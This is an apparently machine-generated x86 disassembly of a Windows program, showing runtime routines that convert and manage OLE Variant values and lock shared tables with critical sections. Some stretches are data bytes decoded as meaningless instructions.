call sub_40ec28
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_403f00
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_403f00
jmp r-xdata
mov dx 0x100
mov ax 0x1
call sub_40df5c
test ah 0x40
je r-xdata
mov eax esi
call sub_403eac
mov edx eax
mov eax ebx
call sub_40ec8c
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x78 ]
mov eax ebx
call sub_40eb5c
mov edx [ ebp - 0x78 ]
mov eax esi
call sub_403f00
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40eb5c
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_403f00
jmp r-xdata
jmp [ eax * 4 + jump_table_40efdd ]
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407c7c
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_403f00
jmp r-xdata
lea edx [ ebp - 0x48 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407c7c
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_403f00
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_40906c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_403f00
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x50 ]
call sub_40906c
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_403f00
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40ea28
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_404134
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x58 ]
call sub_40ea60
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_404134
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_4040d4
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40ea98
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_404134
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407c7c
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_403f00
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407c7c
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_403f00
jmp r-xdata
lea edx [ ebp - 0x68 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407c7c
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_403f00
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x6c ]
call sub_407d68
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_403f00
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x70 ]
call sub_407d68
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_403f00
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40ed10
jmp r-xdata
sub_40f254
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40f2fe
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f2e1
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
push 0x0
push 0x400
push ebx
lea eax [ ebp - 0x10 ]
push eax
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov dx [ ebx ]
mov cx 0x8
call sub_40e39c
push esi
lea eax [ ebp - 0x14 ]
mov edx [ ebp - 0x8 ]
call sub_40469c
mov eax [ ebp - 0x14 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404788
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f2e8
lea eax [ ebp - 0x10 ]
call sub_40e6bc
retn
sub_40f30c
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
mov esi edx
mov ebx eax
lea eax [ ebp - 0x10 ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f362
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
lea eax [ ebp - 0x10 ]
call sub_40e9e4
lea eax [ ebp - 0x10 ]
call [ rw-data ]
lea edx [ ebp - 0x10 ]
mov eax esi
call sub_40f438
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f369
lea eax [ ebp - 0x10 ]
call sub_40e6bc
retn
sub_40f370
push ebp
mov ebp esp
add esp 0xffffffe0
push ebx
xor ecx ecx
mov [ ebp - 0x20 ] ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
xor eax eax
push ebp
push sub_40f428
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0xc ]
mov ax [ ebx ]
call sub_4100a8
mov [ ebp - 0x5 ] al
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor edx edx
mov [ eax ] edx
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f42f
lea eax [ ebp - 0x20 ]
call sub_40458c
retn
lea eax [ ebp - 0x1c ]
push eax
call VariantInit
xor eax eax
push ebp
push sub_40f40b
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x8
mov ecx ebx
lea edx [ ebp - 0x1c ]
mov eax [ ebp - 0xc ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
mov eax [ ebp - 0x4 ]
push eax
lea eax [ ebp - 0x20 ]
mov edx [ ebp - 0x14 ]
call sub_40469c
mov eax [ ebp - 0x20 ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404788
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x1c ]
call sub_40e6bc
retn
sub_40f438
push ebp
mov ebp esp
mov ecx 0xe
push 0x0
push 0x0
dec ecx
jne r-xdata
push ecx
push ebx
push esi
mov ebx edx
mov esi eax
xor eax eax
push ebp
push sub_40f98a
push [ fs : eax ]
mov [ fs : eax ] esp
mov ax [ ebx ]
movzx edx ax
cmp edx 0x14
ja r-xdata
mov edx eax
sub dx 0x100
je r-xdata
jmp [ edx * 4 + jump_table_40f472 ]
mov eax esi
mov edx [ ebx + 0x8 ]
call sub_4046d8
jmp r-xdata
dec dx
je r-xdata
mov eax esi
call sub_40458c
jmp r-xdata
cmp [ rw-data ] 0x0
je r-xdata
lea edx [ ebp - 0x4 ]
movsx eax [ ebx + 0x8 ]
call sub_407c7c
mov edx [ ebp - 0x4 ]
mov eax esi
call sub_4046d8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebx + 0x8 ]
call sub_407c7c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_4046d8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0xc ]
call sub_40906c
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4046d8
jmp r-xdata
fld [ ebx + 0x8 ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x10 ]
call sub_40906c
mov edx [ ebp - 0x10 ]
mov eax esi
call sub_4046d8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x14 ]
call sub_40ea28
mov edx [ ebp - 0x14 ]
mov eax esi
call sub_4045c8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x18 ]
call sub_40ea60
mov edx [ ebp - 0x18 ]
mov eax esi
call sub_4045c8
jmp r-xdata
push esi
lea eax [ ebp - 0x1c ]
mov edx [ ebx + 0x8 ]
call sub_40469c
mov eax [ ebp - 0x1c ]
mov ecx 0x7fffffff
mov edx 0x1
call sub_404788
jmp r-xdata
lea edx [ ebp - 0x20 ]
mov ax [ ebx + 0x8 ]
call sub_40ea98
mov edx [ ebp - 0x20 ]
mov eax esi
call sub_4045c8
jmp r-xdata
lea edx [ ebp - 0x24 ]
movsx eax [ ebx + 0x8 ]
call sub_407c7c
mov edx [ ebp - 0x24 ]
mov eax esi
call sub_4046d8
jmp r-xdata
lea edx [ ebp - 0x28 ]
xor eax eax
mov al [ ebx + 0x8 ]
call sub_407c7c
mov edx [ ebp - 0x28 ]
mov eax esi
call sub_4046d8
jmp r-xdata
lea edx [ ebp - 0x2c ]
movzx eax [ ebx + 0x8 ]
call sub_407c7c
mov edx [ ebp - 0x2c ]
mov eax esi
call sub_4046d8
jmp r-xdata
mov eax [ ebx + 0x8 ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x30 ]
call sub_407d68
mov edx [ ebp - 0x30 ]
mov eax esi
call sub_4046d8
jmp r-xdata
push [ ebx + 0xc ]
push [ ebx + 0x8 ]
lea eax [ ebp - 0x34 ]
call sub_407d68
mov edx [ ebp - 0x34 ]
mov eax esi
call sub_4046d8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f438
jmp r-xdata
lea edx [ ebp - 0x38 ]
mov eax ebx
call sub_40f254
mov edx [ ebp - 0x38 ]
mov eax esi
call sub_4045c8
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40f991
lea eax [ ebp - 0x74 ]
mov edx 0x2
call sub_4045a4
lea eax [ ebp - 0x6c ]
mov edx 0x5
call sub_403ed0
lea eax [ ebp - 0x58 ]
mov edx 0x3
call sub_4045a4
lea eax [ ebp - 0x4c ]
mov edx 0x4
call sub_403ed0
lea eax [ ebp - 0x3c ]
mov edx 0x2
call sub_4045a4
lea eax [ ebp - 0x34 ]
mov edx 0x5
call sub_403ed0
lea eax [ ebp - 0x20 ]
mov edx 0x4
call sub_4045a4
lea eax [ ebp - 0x10 ]
mov edx 0x4
call sub_403ed0
retn
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40f30c
mov edx [ ebp - 0x3c ]
mov eax esi
call sub_4045c8
jmp r-xdata
jmp r-xdata
mov eax esi
mov edx [ rw-data ]
call sub_4046d8
jmp r-xdata
mov dx 0x8
mov ax 0x1
call sub_40df5c
test ah 0x40
je r-xdata
mov eax esi
call sub_40458c
mov edx eax
mov eax ebx
call sub_40f370
test al al
jne r-xdata
movzx eax ax
and eax 0xffffbfff
cmp eax 0x14
ja r-xdata
lea edx [ ebp - 0x74 ]
mov eax ebx
call sub_40f254
mov edx [ ebp - 0x74 ]
mov eax esi
call sub_4045c8
lea edx [ ebp - 0x70 ]
mov eax ebx
call sub_40f254
mov edx [ ebp - 0x70 ]
mov eax esi
call sub_4045c8
jmp r-xdata
jmp [ eax * 4 + jump_table_40f6f9 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407c7c
mov edx [ ebp - 0x40 ]
mov eax esi
call sub_4046d8
jmp r-xdata
lea edx [ ebp - 0x44 ]
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
call sub_407c7c
mov edx [ ebp - 0x44 ]
mov eax esi
call sub_4046d8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x48 ]
call sub_40906c
mov edx [ ebp - 0x48 ]
mov eax esi
call sub_4046d8
jmp r-xdata
mov eax [ ebx + 0x8 ]
fld [ eax ]
add esp 0xfffffff4
fstp [ esp ]
fwait
lea eax [ ebp - 0x4c ]
call sub_40906c
mov edx [ ebp - 0x4c ]
mov eax esi
call sub_4046d8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x50 ]
call sub_40ea28
mov edx [ ebp - 0x50 ]
mov eax esi
call sub_4045c8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x54 ]
call sub_40ea60
mov edx [ ebp - 0x54 ]
mov eax esi
call sub_4045c8
jmp r-xdata
mov eax esi
mov edx [ ebx + 0x8 ]
mov edx [ edx ]
call sub_40469c
jmp r-xdata
lea edx [ ebp - 0x58 ]
mov eax [ ebx + 0x8 ]
mov ax [ eax ]
call sub_40ea98
mov edx [ ebp - 0x58 ]
mov eax esi
call sub_4045c8
jmp r-xdata
lea edx [ ebp - 0x5c ]
mov eax [ ebx + 0x8 ]
movsx eax [ eax ]
call sub_407c7c
mov edx [ ebp - 0x5c ]
mov eax esi
call sub_4046d8
jmp r-xdata
lea edx [ ebp - 0x60 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407c7c
mov edx [ ebp - 0x60 ]
mov eax esi
call sub_4046d8
jmp r-xdata
lea edx [ ebp - 0x64 ]
mov eax [ ebx + 0x8 ]
movzx eax [ eax ]
call sub_407c7c
mov edx [ ebp - 0x64 ]
mov eax esi
call sub_4046d8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov eax [ eax ]
xor edx edx
push edx
push eax
lea eax [ ebp - 0x68 ]
call sub_407d68
mov edx [ ebp - 0x68 ]
mov eax esi
call sub_4046d8
jmp r-xdata
mov eax [ ebx + 0x8 ]
push [ eax + 0x4 ]
push [ eax ]
lea eax [ ebp - 0x6c ]
call sub_407d68
mov edx [ ebp - 0x6c ]
mov eax esi
call sub_4046d8
jmp r-xdata
mov eax [ ebx + 0x8 ]
mov edx eax
mov eax esi
call sub_40f438
jmp r-xdata
sub_40f998
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
test [ edi ] 0xbfe8
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
mov eax edi
call sub_40e640
mov [ edi ] 0x3
movsx eax bl
mov ax [ eax * 2 + rw-data ]
mov [ edi ] ax
jmp r-xdata
mov [ edi + 0x8 ] esi
pop edi
pop esi
pop ebx
retn
sub_40f9d4
push ebp
mov ebp esp
push ebx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
mov [ ebx ] 0x14
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
pop ebx
pop ebp
retn 0x8
mov eax ebx
call sub_40e640
sub_40fa00
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi ] 0xbfe8
je r-xdata
mov [ esi ] 0xb
cmp bl 0x1
cmc
sbb eax eax
mov [ esi + 0x8 ] ax
pop esi
pop ebx
retn
mov eax esi
call sub_40e640
sub_40fa64
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x100
lea eax [ ebx + 0x8 ]
mov edx esi
call sub_403f00
pop esi
pop ebx
retn
mov eax ebx
call sub_40e640
sub_40fa90
push ebx
push esi
mov esi edx
mov ebx eax
test [ ebx ] 0xbfe8
je r-xdata
xor eax eax
mov [ ebx + 0x8 ] eax
mov [ ebx ] 0x8
lea eax [ ebx + 0x8 ]
push eax
mov ecx 0x7fffffff
mov edx 0x1
mov eax esi
call sub_404788
pop esi
pop ebx
retn
mov eax ebx
call sub_40e640
sub_40fc4c
push ebp
mov ebp esp
add esp 0xfffffdf8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x208 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40fd72
push [ fs : eax ]
mov [ fs : eax ] esp
mov edi ebx
and di 0xfff
cmp di 0x14
ja r-xdata
cmp bx 0x100
jne r-xdata
mov eax esi
movzx edx di
mov edx [ edx * 4 + rw-data ]
call sub_403f00
jmp r-xdata
cmp bx 0x101
jne r-xdata
mov eax esi
mov edx r-xdata
call sub_403f00
jmp r-xdata
test bh 0x20
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_4100a8
test al al
je r-xdata
mov eax esi
mov edx r-xdata
call sub_403f00
jmp r-xdata
test bh 0x40
je r-xdata
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4041b8
lea ecx [ ebp - 0x208 ]
movzx eax di
mov edx 0x4
call sub_407d90
mov ecx [ ebp - 0x208 ]
mov edx [ rw-data ]
mov edx [ edx ]
mov eax esi
call sub_4041b8
lea eax [ ebp - 0x104 ]
push eax
lea edx [ ebp - 0x204 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_403040
lea eax [ ebp - 0x204 ]
mov ecx 0x7fffffff
mov edx 0x2
call sub_402864
lea edx [ ebp - 0x104 ]
mov eax esi
call sub_404110
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fd79
lea eax [ ebp - 0x208 ]
call sub_403eac
retn
mov ecx [ esi ]
mov eax esi
mov edx r-xdata
call sub_4041b8
sub_40fdf4
[ edx + ebx * 8 ]
inc eax
add [ eax ] cl
push esi
popad
jb r-xdata
cmp edi edi
popad
outsb
je r-xdata
add [ eax ] eax
add [ ebp - 0x3e ] bl
add al 0x0
push ebx
push esi
push edi
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov edx esp
mov ax [ esi ]
call sub_4100a8
test al al
je r-xdata
mov eax eax
mov eax ebx
call sub_410028
mov ax [ ebx + 0x4 ]
push eax
mov ecx esi
mov edx edi
mov eax [ esp + 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
sub_40fe04
push ebp
mov ebp esp
push ebx
push esi
mov esi rw-data
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_40fe65
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ esi ]
call sub_404c74
mov ebx eax
dec ebx
cmp ebx 0x0
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40fe6c
push rw-data
call LeaveCriticalSection
retn
mov eax [ esi ]
mov eax [ eax + ebx * 4 ]
cmp eax [ rw-data ]
je r-xdata
dec ebx
cmp ebx 0xffffffff
jne r-xdata
call sub_4030f0
sub_40feb4
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov [ ebp - 0x4 ] edx
mov ebx eax
mov edi [ ebp + 0x8 ]
cmp di [ ebx + 0x4 ]
je r-xdata
mov eax ebx
call sub_410028
lea edx [ ebp - 0x8 ]
mov ax [ esi ]
call sub_4100a8
test al al
je r-xdata
push edi
mov ecx esi
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x4
sub_40ff08
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov edi edx
mov esi eax
lea eax [ ebp - 0x1 ]
push eax
mov edx edi
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x38 ]
xor eax eax
mov al [ ebp - 0x1 ]
mov edx [ ebp + 0x8 ]
lea edx [ edx + edx * 2 ]
add edx rw-data
mov al [ edx + eax - 0x2a ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40ff40
push ebx
push esi
push edi
push ebp
push ecx
mov esi ecx
mov edi edx
mov ebx eax
mov ecx esp
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0xc ]
test al al
je r-xdata
mov eax ebx
call sub_410028
mov ax [ esp ]
push eax
mov ecx esi
mov edx edi
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x1c ]
jmp r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
sub_40ff7c
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403464
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
push rw-data
call EnterCriticalSection
xor edx edx
push ebp
push sub_40ffdf
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
mov ax [ eax + 0x4 ]
test ax ax
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ffe6
push rw-data
call LeaveCriticalSection
retn
movzx eax ax
mov edx [ rw-data ]
mov ecx [ rw-data ]
mov [ edx + eax * 4 - 0x400 ] ecx
sub_410080
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov eax ebx
call sub_4031a4
test al al
je r-xdata
mov eax 0x80004002
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_4100a8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
cmp bx 0x100
jb r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
cmp bx 0x7ff
jbe r-xdata
mov al [ ebp - 0x1 ]
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_410150
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404c74
movzx edi bx
mov edx edi
sub edx 0x100
cmp eax edx
setg [ ebp - 0x1 ]
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call LeaveCriticalSection
retn
mov eax [ rw-data ]
mov eax [ eax + edi * 4 - 0x400 ]
mov [ esi ] eax
cmp [ esi ] 0x0
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ esi ]
cmp eax [ rw-data ]
jne r-xdata
mov [ ebp - 0x1 ] al
mov al 0x1
sub_410160
push ebp
mov ebp esp
add esp 0xfffffef0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_410236
push [ fs : eax ]
mov [ fs : eax ] esp
mov [ ebp - 0x9 ] 0x0
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_410219
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
call sub_404c7c
mov esi eax
test esi esi
jl r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410220
push rw-data
call LeaveCriticalSection
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp ebx [ rw-data ]
je r-xdata
mov eax [ rw-data ]
mov ebx [ eax + edi * 4 ]
test ebx ebx
je r-xdata
lea edx [ ebp - 0x110 ]
mov eax [ ebx ]
call sub_403040
lea edx [ ebp - 0x110 ]
lea eax [ ebp - 0x10 ]
call sub_404110
mov eax [ ebp - 0x10 ]
mov edx [ ebp - 0x4 ]
call sub_407ab0
test al al
je r-xdata
mov eax [ ebp - 0x8 ]
mov [ eax ] ebx
mov [ ebp - 0x9 ] 0x1
jmp r-xdata
sub_410250
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4102bf
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4102c6
retn
call sub_40fe04
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov edx [ r-xdata ]
call sub_404e3c
mov eax rw-data
mov ecx 0x15
mov edx [ r-xdata ]
call sub_404928
mov eax rw-data
call sub_403eac
mov eax rw-data
call sub_40e6d0
sub_4102c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410369
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_410370
retn
mov eax rw-data
call sub_40fdd4
mov eax sub_40e3d0
mov [ rw-data ] eax
mov eax sub_40dff8
mov [ rw-data ] eax
mov edx sub_40df08
mov [ rw-data ] edx
mov [ rw-data ] eax
mov eax sub_40e6d0
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40fac8
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40e9e4
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40ed10
mov edx [ rw-data ]
mov [ edx ] eax
mov eax sub_40f438
mov edx [ rw-data ]
mov [ edx ] eax
push rw-data
call InitializeCriticalSection
sub_410374
xchg [ fs : esi ] al
stosd [ edi ]
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + edi * 8 - 0x799c0000 ] ch
inc esi
add [ ebp + 0x640000ff ] ch
xchg [ esi ] al
scasb [ edi ]
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + 0x640000ff ] ch
xchg [ esi ] al
nop
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx + 0x640000ff ] dl
xchg [ esi ] al
xchg edx eax
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx + 0x640000ff ] dl
xchg [ esi ] al
xchg esp eax
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebp + 0x640000ff ] dl
xchg [ esi ] al
xchg esi eax
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + 0x640000ff ] dl
xchg [ esi ] al
cwde
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx + 0x640000ff ] bl
xchg [ esi ] al
0x640000ff 0x4686
add [ ebx + 0x640000ff ] bl
xchg [ esi ] al
pushfd
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ ebp + 0x640000ff ] bl
xchg [ esi ] al
sahf
inc [ eax ]
add [ esi + eax * 4 + 0x46 ] ah
add [ edi + 0x640000ff ] bl
xchg [ esi ] al
cmp bh 0x0
add [ esi + eax * 4 + 0x46 ] ah
add [ ecx + 0x640000ff ] al
xchg [ esi ] al
cmp bh 0x0
add [ esi + eax * 4 + 0x46 ] ah
add [ ebx + 0x640000ff ] al
xchg [ esi ] al
test bh bh
add [ eax ] al
xchg [ fs : esi ] al
test edi edi
add [ eax ] al
xchg [ fs : esi ] al
xchg bh bh
add [ eax ] al
xchg [ fs : esi ] al
xchg edi edi
add [ eax ] al
xchg [ fs : esi ] al
mov bh bh
add [ eax ] al
xchg [ fs : esi ] al
mov edi edi
add [ eax ] al
xchg [ fs : esi ] al
mov bh bh
add [ eax ] al
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_410499
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4104a0
retn
sub_4104e4
push ebx
push esi
push edi
test edx edx
je r-xdata
or eax 0xffffffff
xor ecx ecx
mov cl [ eax + 0x1 ]
mov eax [ eax + ecx + 0xb ]
mov eax [ eax ]
mov cl [ eax + 0x1 ]
lea esi [ eax + ecx + 0xf ]
mov edi [ eax + ecx + 0x7 ]
xor eax eax
inc eax
lea esi [ ecx + esi + 0x1 ]
cmp eax edi
jle r-xdata
mov bl [ ecx + edx - 0x1 ]
xor bl [ ecx + esi ]
test bl 0xdf
jne r-xdata
mov cl [ esi ]
cmp ecx [ edx - 0x4 ]
jne r-xdata
mov cl [ esi ]
dec ecx
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_410530
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx ] 0x1
jne r-xdata
mov eax ebx
call sub_4104d8
cmp [ eax + 0x1 ] 0x0
jge r-xdata
mov eax esi
call sub_407db8
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_4104e4
mov edx [ rw-data ]
mov eax esi
call sub_407ab0
test al al
je r-xdata
mov edx [ rw-data ]
mov eax esi
call sub_407ab0
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax esi
call sub_407db8
jmp r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
pop ebx
retn
sub_410594
push ebx
push esi
push edi
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx edx
or edx edx
je r-xdata
xor ebx ebx
mov bl [ eax + 0x1 ]
lea esi [ eax + ebx + 0x2 ]
mov bl [ esi + 0xa ]
movzx edi [ esi + ebx + 0xb ]
test edi edi
je r-xdata
mov cl [ edx - 0x4 ]
mov ch [ edx ]
and ecx 0xdfff
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
lea eax [ esi + ebx + 0xd ]
mov eax [ eax ]
jmp r-xdata
mov bh 0x0
mov bh 0x0
dec edi
lea eax [ eax + ebx + 0x1b ]
jne r-xdata
mov ch [ edx ]
and ch 0xdf
mov bl [ eax + 0x1a ]
jmp r-xdata
dec ebx
jne r-xdata
mov bx [ eax + 0x1a ]
and bh 0xdf
cmp ebx ecx
je r-xdata
mov ch [ ebx + edx - 0x1 ]
xor ch [ eax + ebx + 0x1a ]
test ch 0xdf
jne r-xdata
sub_410604
push ebx
push edi
mov edi [ edx ]
mov edi [ edi ]
mov bl 0x4
cmp [ edi ] 0x7
je r-xdata
mov ecx [ edx + 0x4 ]
